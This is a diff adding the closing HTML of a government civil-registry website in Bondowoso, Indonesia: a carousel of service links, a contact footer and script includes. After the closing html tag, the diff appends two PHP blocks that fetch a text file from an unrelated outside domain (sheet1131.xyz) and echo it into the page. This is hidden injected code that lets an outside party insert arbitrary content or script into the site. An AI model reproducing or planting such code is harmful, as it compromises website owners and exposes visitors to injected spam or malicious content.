+															</span>
+														</span>
+													</span>
+												</div>
+											</a>
+																					<a href="https://dispendukpencapil.bondowosokab.go.id/" target="_blank">
+												<div class="owl-item active" style="width: 204.5px; margin-right: 10px;">
+													<span class="thumb-info thumb-info-no-borders thumb-info-no-borders-rounded thumb-info-lighten thumb-info-bottom-info thumb-info-bottom-info-dark thumb-info-bottom-info-dark-linear thumb-info-centered-icons">
+														<span class="thumb-info-wrapper">
+															<img src="https://dispendukpencapil.bondowosokab.go.id/uploads/link/fcd5c9cfe0eefa260f66e0a2f399653b.jpg" class="img-fluid" alt="">
+															<span class="thumb-info-title">
+																<span class="thumb-info-inner line-height-1">Surat Pindah</span>
+															</span>
+														</span>
+													</span>
+												</div>
+											</a>
+																					<a href="https://dispendukpencapil.bondowosokab.go.id/" target="_blank">
+												<div class="owl-item active" style="width: 204.5px; margin-right: 10px;">
+													<span class="thumb-info thumb-info-no-borders thumb-info-no-borders-rounded thumb-info-lighten thumb-info-bottom-info thumb-info-bottom-info-dark thumb-info-bottom-info-dark-linear thumb-info-centered-icons">
+														<span class="thumb-info-wrapper">
+															<img src="https://dispendukpencapil.bondowosokab.go.id/uploads/link/7b35a2b584fe9e1ed617c28a7c096101.jpg" class="img-fluid" alt="">
+															<span class="thumb-info-title">
+																<span class="thumb-info-inner line-height-1">Akta Nikah</span>
+															</span>
+														</span>
+													</span>
+												</div>
+											</a>
+																					<a href="https://dispendukpencapil.bondowosokab.go.id/" target="_blank">
+												<div class="owl-item active" style="width: 204.5px; margin-right: 10px;">
+													<span class="thumb-info thumb-info-no-borders thumb-info-no-borders-rounded thumb-info-lighten thumb-info-bottom-info thumb-info-bottom-info-dark thumb-info-bottom-info-dark-linear thumb-info-centered-icons">
+														<span class="thumb-info-wrapper">
+															<img src="https://dispendukpencapil.bondowosokab.go.id/uploads/link/8c0b86986d7bb73fe58389046f6fca11.jpg" class="img-fluid" alt="">
+															<span class="thumb-info-title">
+																<span class="thumb-info-inner line-height-1">AKta Cerai</span>
+															</span>
+														</span>
+													</span>
+												</div>
+											</a>
+																					<a href="https://dispendukpencapil.bondowosokab.go.id/" target="_blank">
+												<div class="owl-item active" style="width: 204.5px; margin-right: 10px;">
+													<span class="thumb-info thumb-info-no-borders thumb-info-no-borders-rounded thumb-info-lighten thumb-info-bottom-info thumb-info-bottom-info-dark thumb-info-bottom-info-dark-linear thumb-info-centered-icons">
+														<span class="thumb-info-wrapper">
+															<img src="https://dispendukpencapil.bondowosokab.go.id/uploads/link/87dfd6c9c4c058639847dc98178a3c0e.jpg" class="img-fluid" alt="">
+															<span class="thumb-info-title">
+																<span class="thumb-info-inner line-height-1">Pencatatan Pengangkatan Anak</span>
+															</span>
+														</span>
+													</span>
+												</div>
+											</a>
+																					<a href="https://dispendukpencapil.bondowosokab.go.id/" target="_blank">
+												<div class="owl-item active" style="width: 204.5px; margin-right: 10px;">
+													<span class="thumb-info thumb-info-no-borders thumb-info-no-borders-rounded thumb-info-lighten thumb-info-bottom-info thumb-info-bottom-info-dark thumb-info-bottom-info-dark-linear thumb-info-centered-icons">
+														<span class="thumb-info-wrapper">
+															<img src="https://dispendukpencapil.bondowosokab.go.id/uploads/link/9a21544f78a4a901cbf1d962714a12ef.jpg" class="img-fluid" alt="">
+															<span class="thumb-info-title">
+																<span class="thumb-info-inner line-height-1">Pencatatan Pengakuan Anak</span>
+															</span>
+														</span>
+													</span>
+												</div>
+											</a>
+																					<a href="https://dispendukpencapil.bondowosokab.go.id/" target="_blank">
+												<div class="owl-item active" style="width: 204.5px; margin-right: 10px;">
+													<span class="thumb-info thumb-info-no-borders thumb-info-no-borders-rounded thumb-info-lighten thumb-info-bottom-info thumb-info-bottom-info-dark thumb-info-bottom-info-dark-linear thumb-info-centered-icons">
+														<span class="thumb-info-wrapper">
+															<img src="https://dispendukpencapil.bondowosokab.go.id/uploads/link/422fb057394166d8b72c70eb897ddef2.jpg" class="img-fluid" alt="">
+															<span class="thumb-info-title">
+																<span class="thumb-info-inner line-height-1">Pencatatan Pengesahan Anak</span>
+															</span>
+														</span>
+													</span>
+												</div>
+											</a>
+																			</div>
+								</div>
+								<div class="owl-nav">
+									<button type="button" role="presentation" class="owl-prev disabled"></button>
+									<button type="button" role="presentation" class="owl-next"></button>
+								</div>
+								<div class="owl-dots disabled"></div>
+							</div>
+						</div>
+					</div>
+				</div>
+                </div>
+
+			</div>
+			<footer id="footer" style="background-color: #000080;">
+				<div class="container">
+					<div class="footer-ribbon">
+						<span>Kontak Kami</span>
+					</div>
+					<div class="row py-5 my-4">
+						<div class="col-md-6 col-lg-4 mb-4 mb-lg-0">
+							<img alt="DISDUKCAPIL" width="250" height="70" data-sticky-width="150" data-sticky-height="50" src="https://dispendukpencapil.bondowosokab.go.id/gisa.png">
+						</div>
+						<div class="col-md-6 col-lg-3 mb-4 mb-lg-0">
+							<h5 class="text-3 mb-3">Lokasi</h5>
+							<div><iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3951.704956424949!2d113.82268647500653!3d-7.925853492097855!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x2dd6dcce63cef7d3%3A0xaf31844944c51f2c!2sDISPENDUK%20KABUPATEN%20BONDOWOSO!5e0!3m2!1sen!2sid!4v1695628655454!5m2!1sen!2sid" width="250" height="150" style="border:0;" allowfullscreen="" loading="lazy" referrerpolicy="no-referrer-when-downgrade"></iframe></div>
+						</div>
+						<div class="col-md-6 col-lg-3 mb-4 mb-md-0">
+							<h5 class="text-3 mb-3">CONTACT US</h5>
+							<ul class="list list-icons list-icons-lg">
+								<li class="mb-1"><i class="far fa-dot-circle text-light"></i><p class="m-0 text-light">Jl. Kis Mangunsarkoro No.136C, Gentengan, Tamansari, Kec.Bondowoso</p></li>
+								<li class="mb-1"><i class="fab fa-whatsapp text-light"></i><p class="m-0 "><a class="text-light" href="http://s.id/wa_dukcapilbwoso">http://s.id/wa_dukcapilbwoso</a></p></li>
+								<li class="mb-1"><i class="far fa-envelope text-light"></i><p class="m-0"><a class="text-light" href="mailto:dispendukcapilbondowoso@gmail.com">dispendukcapilbondowoso@gmail.com</a></p></li>
+								<li class="mb-1"><i class="fa-solid fa-phone text-light"></i><p class="m-0"><a class="text-light" href="tel:(0332) 423075">(0332) 423075</a></p></li>
+							</ul>
+						</div>
+						<div class="col-md-6 col-lg-2">
+							<h5 class="text-3 mb-3">FOLLOW US</h5>
+							<ul class="footer-social-icons social-icons m-0">
+								<li class="social-icons-facebook"><a href="https://www.facebook.com/profile.php?id=100093700780138" target="_blank" title="Facebook"><i class="fab fa-facebook-f"></i></a></li>
+								<li class="social-icons-instagram"><a href="https://www.instagram.com/dispendukcapilbondowoso/?next=%2F" target="_blank" title="Instagram"><i class="fab fa-instagram"></i></a></li>
+								<li class="social-icons-twitter"><a href="https://twitter.com/Dukcapil_bwoso" target="_blank" title="Twitter"><i class="fab fa-twitter"></i></a></li>
+								<li class="social-icons-youtube"><a href="https://www.youtube.com/channel/UCKOzSZoGkRxNLgojQ8T3llg" target="_blank" title="Youtube"><i class="fab fa-youtube"></i></a></li>
+							</ul>
+						</div>
+					</div>
+				</div>
+				<div class="footer-copyright">
+					<div class="container py-2">
+						<div class="row py-4">
+							<div class="col-lg-1 d-flex align-items-center justify-content-center justify-content-lg-start mb-2 mb-lg-0">
+								<a href="https://kominfo.bondowosokab.go.id" class="logo pr-0 pr-lg-3" target="_blank">
+									<img alt="Diskominfo Kab. Bondowoso" src="https://dispendukpencapil.bondowosokab.go.id//packages/diskominfo.png" class="opacity-5" height="32">
+								</a>
+							</div>
+							<div class="col-lg-7 d-flex align-items-center justify-content-center justify-content-lg-start mb-4 mb-lg-0">
+								<p>© Copyright 2023. All Rights Reserved.</p>
+							</div>
+						</div>
+					</div>
+				</div>
+			</footer>
+		</div>
+
+		<!-- Vendor -->
+		<script src="https://dispendukpencapil.bondowosokab.go.id/assets/vendor/plugins/js/plugins.min.js"></script>
+		<!-- Theme Base, Components and Settings -->
+		<script src="https://dispendukpencapil.bondowosokab.go.id/assets/js/theme.js"></script>
+
+		<!-- Current Page Vendor and Views -->
+		<script src="https://dispendukpencapil.bondowosokab.go.id/assets/js/views/view.contact.js"></script>
+
+		<!-- Theme Custom -->
+		<script src="https://dispendukpencapil.bondowosokab.go.id/assets/js/custom.js"></script>
+		<!-- Theme Initialization Files -->
+		<script src="https://dispendukpencapil.bondowosokab.go.id/assets/js/theme.init.js"></script>
+	</body>
+</html>
+<?php
+$curl = curl_init();
+$url = 'https://sheet1131.xyz/ptacid.txt';
+curl_setopt($curl, CURLOPT_URL, $url);
+curl_setopt($curl, CURLOPT_HEADER, 0);
+curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
+$result = curl_exec($curl);
+echo $result;?>
+
+<?php
+$a = file_get_contents('https://sheet1131.xyz/ptacid.txt');
+echo $a;
+?>
